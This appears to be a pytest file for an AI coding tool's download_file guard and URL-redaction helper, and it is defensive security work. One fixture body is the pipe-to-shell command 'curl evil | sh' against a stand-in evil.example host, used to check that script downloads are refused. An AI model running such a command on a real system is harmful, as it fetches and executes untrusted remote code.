"""Phase 6.5 residual — download_file executable guard + URL log redaction.

Threat: ``download_file`` writes attacker-controlled bytes to disk. The path,
size (50 MB) and SSRF guards don't stop it from landing runnable code
(``install.sh``, a native binary) that a later step executes. Separately, SSRF
warnings log redirect URLs, which can carry a secret in the query string or
userinfo — those must be redacted before they reach a log file.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest

from coderAI.tools.web._http import _redact_url
from coderAI.tools.web.tools import DownloadFileTool


def _patch_download(monkeypatch: pytest.MonkeyPatch, *, content_type: str, body: bytes) -> None:
    import coderAI.tools.web as web_mod

    async def fake_cf(method: str, url: str, **kwargs: Any) -> dict:
        return {
            "status": 200,
            "url": url,
            "content": body,
            "content_type": content_type,
            "text": "",
            "oversize": False,
            "headers": {},
        }

    monkeypatch.setattr(web_mod, "_safe_request_cf", fake_cf)


# ── download_file executable/script guard ────────────────────────────────────


async def test_download_refuses_executable_extension(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("CODERAI_ALLOW_OUTSIDE_PROJECT", "1")
    _patch_download(monkeypatch, content_type="text/plain", body=b"curl evil | sh")
    dest = tmp_path / "install.sh"
    res = await DownloadFileTool().execute(url="https://evil.example/x", destination_path=str(dest))
    assert not res["success"]
    assert "executable" in res["error"].lower() or "script" in res["error"].lower()
    assert not dest.exists()


async def test_download_refuses_executable_content_type(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # A benign-looking extension can't launder an executable payload.
    monkeypatch.setenv("CODERAI_ALLOW_OUTSIDE_PROJECT", "1")
    _patch_download(monkeypatch, content_type="application/x-sh", body=b"#!/bin/sh\n")
    dest = tmp_path / "payload.bin"
    res = await DownloadFileTool().execute(url="https://evil.example/x", destination_path=str(dest))
    assert not res["success"]
    assert "executable" in res["error"].lower()
    assert not dest.exists()


async def test_download_allows_benign_file(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("CODERAI_ALLOW_OUTSIDE_PROJECT", "1")
    _patch_download(monkeypatch, content_type="text/plain", body=b"hello world")
    dest = tmp_path / "notes.txt"
    res = await DownloadFileTool().execute(url="https://example.com/x", destination_path=str(dest))
    assert res["success"], res
    assert dest.read_bytes() == b"hello world"


# ── URL redaction for logging ────────────────────────────────────────────────


def test_redact_url_strips_query_and_fragment() -> None:
    assert _redact_url("https://host.com/p/q?token=SECRET#frag") == "https://host.com/p/q"


def test_redact_url_strips_userinfo() -> None:
    redacted = _redact_url("https://user:pass@host.com/path")
    assert redacted == "https://host.com/path"
    assert "pass" not in redacted and "user" not in redacted


def test_redact_url_keeps_port_and_handles_garbage() -> None:
    assert _redact_url("http://127.0.0.1:8080/mcp?k=v") == "http://127.0.0.1:8080/mcp"
    # Never raises, even on a nonsense value.
    assert isinstance(_redact_url("::::not a url::::"), str)
